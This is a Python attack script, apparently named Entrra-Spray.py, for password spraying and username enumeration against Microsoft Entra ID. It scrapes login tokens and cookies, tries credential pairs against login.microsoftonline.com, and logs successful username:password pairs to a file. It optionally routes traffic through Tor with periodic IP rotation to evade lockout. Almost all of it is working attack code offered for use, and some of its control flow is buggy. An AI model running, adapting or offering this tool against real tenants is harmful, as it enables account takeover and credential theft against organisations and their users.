import httpx
import re
import stem.control
import time
from urllib.parse import quote_plus
from urllib.parse import unquote, urlparse, parse_qs
import argparse
import getpass
import os

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"


def load_list(input_str):
    if os.path.isfile(input_str):
        with open(input_str, "r") as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [input_str]

parser = argparse.ArgumentParser(
    description="Spray or test Microsoft login using username(s) and password(s).",
    epilog="Example usage:\n"
           "  python3 Entrra-Spray.py -user users.txt -pass passwords.txt\n"
           "  python3 Entrra-Spray.py -user username@domain.com -pass 'X' -check\n"
           "  python3 Entrra-Spray.py -user u@d.com -pass 'X' -check -proxytor",
    formatter_class=argparse.RawTextHelpFormatter
)

parser.add_argument("-user", required=True, help="Single username or path to usernames file (TXT)")
parser.add_argument("-pass", dest="password", required=True, help="Single password or path to passwords file (TXT)")
parser.add_argument("-check", action="store_true", help="Enable check mode (check if Identity exists in Entra - May return false positives)")
parser.add_argument(
    "-proxytor",
    action="store_true",
    help="Route all traffic through TOR (requires Tor service running on localhost:9050). IP will renew every 7 minutes."
)

args = parser.parse_args()

usernames = load_list(args.user)
passwords = load_list(args.password)
proxies = None


def get_tor_ip():
    try:
        with httpx.Client(transport=transport, timeout=20) as client:
            ip = client.get("https://api.ipify.org").text.strip()
            print(f"{BLUE}[i] Current TOR IP: {ip}{RESET}")
    except Exception as e:
        print(f"{RED}[✗] Could not retrieve TOR IP: {e}{RESET}")

def renew_tor_ip():
    global last_ip_renewal
    try:
        with stem.control.Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(stem.Signal.NEWNYM)
            last_ip_renewal = time.time()
            print(f"{BLUE}[✓] Renewed TOR IP{RESET}")
            get_tor_ip()
    except Exception as e:
        print(f"{RED}[✗] Failed to renew TOR IP: {e}{RESET}")

if args.proxytor:
    last_ip_renewal = time.time()
    renew_interval = 420
    proxies = "socks5h://127.0.0.1:9050"
    transport = httpx.HTTPTransport(proxy=proxies)
    get_tor_ip()  
    
        
with open("valid-users.txt", "w") as f:
    pass

for username in usernames:
    for password in passwords:
        if args.proxytor and time.time() - last_ip_renewal >= renew_interval:
            renew_tor_ip()
            
            
            #first action - login (with proxy):
            
            url_login = "https://login.microsoftonline.com/"
            headers_login = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Sec-Purpose": "prefetch;prerender",
                "Purpose": "prefetch",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i",
            }
            
            try:
                with httpx.Client(proxies=proxies, timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
                    response_login = client.get(url_login)
                    cookies_dict_login = dict(response_login.cookies)
                    cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]

                    for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
                        globals()[f"cookie_login{i}"] = cookie_login
                        #print(f"Var Created: cookie{i} = {{'name': '{cookie['name']}', 'value': '{cookie['value']}'}}")

                for i in range(1, 5):
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        cookie_login = globals()[var_name]
                    else:
                        print(f"{var_name}: not found")

            except httpx.ReadTimeout:
                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error: {e}{RESET}")
            except Exception:
                print(f"{RED}[✗] Unexpected error occurred{RESET}")
            
            
            #Sec action - Getting 2 urls (with proxy):

            url_geturls = "https://www.office.com/login"
            headers_geturls = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            }
            try: 
                with httpx.Client(proxies=proxies, timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
                    response_geturls = client.get(url_geturls)
                    location = response_geturls.headers.get("location")
                    if not location:
                        raise Exception("Redirect Location header not found")
                        
                url1 = location + "&sso_reload=true"
                url2 = location
                
                cookie_header = ""
                for i in range(1, 20):  
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        ck = globals()[var_name]
                        cookie_header += f"{ck['name']}={ck['value']}; "

                cookie_header = cookie_header.strip().rstrip(";")

            except httpx.ReadTimeout:
                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error: {e}{RESET}")
            except Exception:
                print(f"{RED}[✗] Unexpected error occurred{RESET}")


            #third action - Getting Cookies and Body Parametrs from url1+url2 (with proxy):
            headers_ulrs = {
                "Host": "login.microsoftonline.com",
                "Cookie": cookie_header,
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i"
            }
            try: 
                with httpx.Client(proxies=proxies, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                    response2 = client.get(url1)
                    cookies_dict2 = dict(response2.cookies)
                    cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
                    for i, cookie2 in enumerate(cookies_list2[:6], 1):  
                        globals()[f"cookie_url1{i}"] = cookie2
                        #print(f"varb created: cookie_url1{i} = {{'name': '{cookie2['name']}', 'value': '{cookie2['value']}'}}")

                with httpx.Client(proxies=proxies, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                    response3 = client.get(url2)
                    cookies_dict3 = dict(response3.cookies)
                    cookies_list3 = [{"name": name, "value": value} for name, value in cookies_dict3.items()]
                    for i, cookie3 in enumerate(cookies_list3[:1], 1):  
                        globals()[f"cookie_url2{i}"] = cookie3
                        #print(f"varb created: cookie_url2{i} = {{'name': '{cookie3['name']}', 'value': '{cookie3['value']}'}}")

                html = response2.text.replace("\\u0026", "&")
                match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
                if not match_reset:
                    raise Exception("Reset URL not found")
                    
                decoded_reset = unquote(match_reset.group())
                inner_url = decoded_reset.split("ru=", 1)[-1]
                parsed_inner = urlparse(inner_url)
                ctx = parse_qs(parsed_inner.query).get("ctx", [None])[0]

                match_canary = re.search(r'"canary"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                canary = match_canary.group(1) if match_canary else None

                match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                flowtoken = match_flow.group(1) if match_flow else None

            except httpx.ReadTimeout:
                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error: {e}{RESET}")
            except Exception:
                print(f"{RED}[✗] Unexpected error occurred{RESET}")
            
            
            #Check id User Exist (with proxy):
            url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
            headers_UserExsit = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Hpgid": "1104",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Hpgact": "1800",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
                "Content-Type": "application/json; charset=UTF-8",
                "Origin": "https://login.microsoftonline.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=1, i"
            }
            payload_UserExsit = {
                "username": f"{username}",
                "flowToken": f"{flowtoken}"
            }
            
            try: 
                if args.check:
                    try:
                        with httpx.Client(proxies=proxies, timeout=20, http2=True ) as client:
                            response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                            if '"FederationRedirectUrl"' in response_UserExsit.text:
                                print(f"{BLUE}[!] Can not enumeration if username is exist {RESET}")
                                continue
                            if '"IfExistsResult":0' in response_UserExsit.text:
                                pass
                            else:
                                print(f"{RED}[✗] Username: {username} not exists{RESET}")
                                continue
                                
                    except httpx.ReadTimeout:
                        print(f"{RED}[✗] Request timed out while checking user: {username}{RESET}")
                        continue

                    except httpx.RequestError as e:
                        print(f"{RED}[✗] Request error for {username}: {e}{RESET}")
                        continue
        
            except httpx.ReadTimeout:
                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error: {e}{RESET}")
            except Exception:
                print(f"{RED}[✗] Unexpected error occurred{RESET}")
                
            
             #Final Request - POST with username and password (with proxy):
            url_check_password = "https://login.microsoftonline.com/common/login"
            headers_check_password = {
                "Host": "login.microsoftonline.com",
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://login.microsoftonline.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Priority": "u=0, i",
            }

            cookies_string = f"""{cookie_url11['name']}={cookie_url11['value']}&AADSSO=NA|NoExtension&SSOCOOKIEPULLED=1&{cookie_url12['name']}={cookie_url12['value']}&{cookie_url13['name']}={cookie_url13['value']}&{cookie_url14['name']}={cookie_url14['value']}&{cookie_url15['name']}={cookie_url15['value']}&{cookie_url21['name']}={cookie_url21['value']}&MicrosoftApplicationsTelemetryDeviceId=31776052-89f1-4caf-82a2-4ccf2a9b7f37"""
            cookies_check_password = dict(cookie.split("=", 1) for cookie in cookies_string.split("&"))

            canary = quote_plus(f"{canary}")
            ctx = quote_plus(f"{ctx}")
            flowToken = quote_plus(f"{flowtoken}")
            
            data_check_password = f"""login={username}&loginfmt={username}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&canary={canary}&ctx={ctx}&flowToken={flowToken}"""  
                
            
            try: 
                try:
                    with httpx.Client(proxies=proxies, timeout=20, http2=True ) as client:
                        response_check_password = client.post(url_check_password, headers=headers_check_password, cookies=cookies_check_password, data=data_check_password)
                        cookies_dict = dict(response_check_password.cookies)
                        if args.check:
                            if "ESTSAUTHPERSISTENT" in cookies_dict:
                                print(f"{GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}")
                                with open("valid-users.txt", "a") as log_file:
                                    log_file.write(f"{username}:{password}\n")
                                break            
                            else:
                                if "<html><head><title>Working...</title></head>" in response_check_password.text:
                                    print(f"{GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server")
                                    with open("valid-users.txt", "a") as log_file:
                                        log_file.write(f"{username}:{password}\n")
                                    break
                                else:
                                    print(f"{BLUE}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}")
                                    with open("valid-users.txt", "a") as log_file:
                                        log_file.write(f"{username}\n")
                                    
                        else :
                            if "ESTSAUTHPERSISTENT" in cookies_dict:
                                print(f"{GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}")
                                with open("valid-users.txt", "a") as log_file:
                                    log_file.write(f"{username}:{password}\n")
                                break            
                            else:
                                if "<html><head><title>Working...</title></head>" in response_check_password.text:
                                    print(f"{GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server")
                                    with open("valid-users.txt", "a") as log_file:
                                        log_file.write(f"{username}:{password}\n")
                                    break
                                else:
                                    print(f"{YELLOW}[-] Failed to authenticate with {username} with password {password}, didn't check if user exists")   

                except httpx.ReadTimeout:
                    print(f"{RED}[✗] Request timed out while checking user: {username}{RESET}")
                    continue

                except httpx.RequestError as e:
                    print(f"{RED}[✗] Request error for {username}: {e}{RESET}")
                    continue
               
            
            except httpx.ReadTimeout:
                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error: {e}{RESET}")
            except Exception:
                print(f"{RED}[✗] Unexpected error occurred{RESET}")
            
             
            print(f"{BLUE} seccess Logs written to valid-users.txt {RESET}")
            
            
        else :
            #first action - login:
            
            url_login = "https://login.microsoftonline.com/"
            headers_login = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Sec-Purpose": "prefetch;prerender",
                "Purpose": "prefetch",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i",
            }
            
            try:
                with httpx.Client(timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
                    response_login = client.get(url_login)
                    cookies_dict_login = dict(response_login.cookies)
                    cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]

                    for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
                        globals()[f"cookie_login{i}"] = cookie_login
                        #print(f"Var Created: cookie{i} = {{'name': '{cookie['name']}', 'value': '{cookie['value']}'}}")

                for i in range(1, 5):
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        cookie_login = globals()[var_name]
                    else:
                        print(f"{var_name}: not found")

            except httpx.ReadTimeout:
                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error: {e}{RESET}")
            except Exception:
                print(f"{RED}[✗] Unexpected error occurred{RESET}")
            
            
            #Sec action - Getting 2 urls:

            url_geturls = "https://www.office.com/login"
            headers_geturls = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            }
            try: 
                with httpx.Client(timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
                    response_geturls = client.get(url_geturls)
                    location = response_geturls.headers.get("location")
                    if not location:
                        raise Exception("Redirect Location header not found")
                        
                url1 = location + "&sso_reload=true"
                url2 = location
                cookie_header = ""
                for i in range(1, 20):  
                    var_name = f"cookie_login{i}"
                    if var_name in globals():
                        ck = globals()[var_name]
                        cookie_header += f"{ck['name']}={ck['value']}; "

                cookie_header = cookie_header.strip().rstrip(";")

            except httpx.ReadTimeout:
                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error: {e}{RESET}")
            except Exception:
                print(f"{RED}[✗] Unexpected error occurred{RESET}")


            #third action - Getting Cookies and Body Parametrs from url1+url2:
            headers_ulrs = {
                "Host": "login.microsoftonline.com",
                "Cookie": cookie_header,
                "Accept-Language": "en-US,en;q=0.9",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=0, i"
            }
            try: 
                with httpx.Client(timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                    response2 = client.get(url1)
                    cookies_dict2 = dict(response2.cookies)
                    cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
                    for i, cookie2 in enumerate(cookies_list2[:6], 1):  
                        globals()[f"cookie_url1{i}"] = cookie2
                        #print(f"varb created: cookie_url1{i} = {{'name': '{cookie2['name']}', 'value': '{cookie2['value']}'}}")

                with httpx.Client(timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
                    response3 = client.get(url2)
                    cookies_dict3 = dict(response3.cookies)
                    cookies_list3 = [{"name": name, "value": value} for name, value in cookies_dict3.items()]
                    for i, cookie3 in enumerate(cookies_list3[:1], 1):  
                        globals()[f"cookie_url2{i}"] = cookie3
                        #print(f"varb created: cookie_url2{i} = {{'name': '{cookie3['name']}', 'value': '{cookie3['value']}'}}")

                html = response2.text.replace("\\u0026", "&")
                match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
                if not match_reset:
                    raise Exception("Reset URL not found")
                    
                decoded_reset = unquote(match_reset.group())
                inner_url = decoded_reset.split("ru=", 1)[-1]
                parsed_inner = urlparse(inner_url)
                ctx = parse_qs(parsed_inner.query).get("ctx", [None])[0]

                match_canary = re.search(r'"canary"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                canary = match_canary.group(1) if match_canary else None

                match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
                flowtoken = match_flow.group(1) if match_flow else None

            except httpx.ReadTimeout:
                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error: {e}{RESET}")
            except Exception:
                print(f"{RED}[✗] Unexpected error occurred{RESET}")
            
            
            #Check id User Exist:
            url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
            headers_UserExsit = {
                "Host": "login.microsoftonline.com",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Hpgid": "1104",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Hpgact": "1800",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
                "Content-Type": "application/json; charset=UTF-8",
                "Origin": "https://login.microsoftonline.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Accept-Encoding": "gzip, deflate, br",
                "Priority": "u=1, i"
            }
            payload_UserExsit = {
                "username": f"{username}",
                "flowToken": f"{flowtoken}"
            }
            
            try: 
                if args.check:
                    try:
                        with httpx.Client(timeout=20, http2=True ) as client:
                            response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                            if '"FederationRedirectUrl"' in response_UserExsit.text:
                                print(f"{BLUE}[!] Can not enumeration if username is exist {RESET}")
                                continue
                            if '"IfExistsResult":0' in response_UserExsit.text:
                                pass
                            else:
                                print(f"{RED}[✗] Username: {username} not exists{RESET}")
                                continue
                                
                    except httpx.ReadTimeout:
                        print(f"{RED}[✗] Request timed out while checking user: {username}{RESET}")
                        continue

                    except httpx.RequestError as e:
                        print(f"{RED}[✗] Request error for {username}: {e}{RESET}")
                        continue
        
            except httpx.ReadTimeout:
                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error: {e}{RESET}")
            except Exception:
                print(f"{RED}[✗] Unexpected error occurred{RESET}")
                
            
             #Final Request - POST with username and password
            url_check_password = "https://login.microsoftonline.com/common/login"
            headers_check_password = {
                "Host": "login.microsoftonline.com",
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://login.microsoftonline.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Priority": "u=0, i",
            }

            cookies_string = f"""{cookie_url11['name']}={cookie_url11['value']}&AADSSO=NA|NoExtension&SSOCOOKIEPULLED=1&{cookie_url12['name']}={cookie_url12['value']}&{cookie_url13['name']}={cookie_url13['value']}&{cookie_url14['name']}={cookie_url14['value']}&{cookie_url15['name']}={cookie_url15['value']}&{cookie_url21['name']}={cookie_url21['value']}&MicrosoftApplicationsTelemetryDeviceId=31776052-89f1-4caf-82a2-4ccf2a9b7f37"""
            cookies_check_password = dict(cookie.split("=", 1) for cookie in cookies_string.split("&"))

            canary = quote_plus(f"{canary}")
            ctx = quote_plus(f"{ctx}")
            flowToken = quote_plus(f"{flowtoken}")
            
            data_check_password = f"""login={username}&loginfmt={username}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&canary={canary}&ctx={ctx}&flowToken={flowToken}"""  
                
            
            try: 
                try:
                    with httpx.Client(timeout=20, http2=True ) as client:
                        response_check_password = client.post(url_check_password, headers=headers_check_password, cookies=cookies_check_password, data=data_check_password)
                        cookies_dict = dict(response_check_password.cookies)
                        if args.check:
                            if "ESTSAUTHPERSISTENT" in cookies_dict:
                                print(f"{GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
                                with open("valid-users.txt", "a") as log_file:
                                    log_file.write(f"{username}:{password}\n")
                                break            
                            else:
                                if "<html><head><title>Working...</title></head>" in response_check_password.text:
                                    print(f"{GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
                                    with open("valid-users.txt", "a") as log_file:
                                        log_file.write(f"{username}:{password}\n")
                                    break
                                else:
                                    print(f"{BLUE}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}{RESET}")
                                    with open("valid-users.txt", "a") as log_file:
                                        log_file.write(f"{username}\n")
                                    
                        else :
                            if "ESTSAUTHPERSISTENT" in cookies_dict:
                                print(f"{GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
                                with open("valid-users.txt", "a") as log_file:
                                    log_file.write(f"{username}:{password}\n")
                                break            
                            else:
                                if "<html><head><title>Working...</title></head>" in response_check_password.text:
                                    print(f"{GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
                                    with open("valid-users.txt", "a") as log_file:
                                        log_file.write(f"{username}:{password}\n")
                                    break
                                else:
                                    print(f"{YELLOW}[-] Failed to authenticate with {username} with password {password}, didn't check if user exists{RESET}")   

                except httpx.ReadTimeout:
                    print(f"{RED}[✗] Request timed out while checking user: {username}{RESET}")
                    continue

                except httpx.RequestError as e:
                    print(f"{RED}[✗] Request error for {username}: {e}{RESET}")
                    continue
               
            
            except httpx.ReadTimeout:
                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
            except httpx.RequestError as e:
                print(f"{RED}[✗] Request error: {e}{RESET}")
            except Exception:
                print(f"{RED}[✗] Unexpected error occurred{RESET}")
            
             
            print(f"{CYAN} seccess Logs written to valid-users.txt {RESET}")
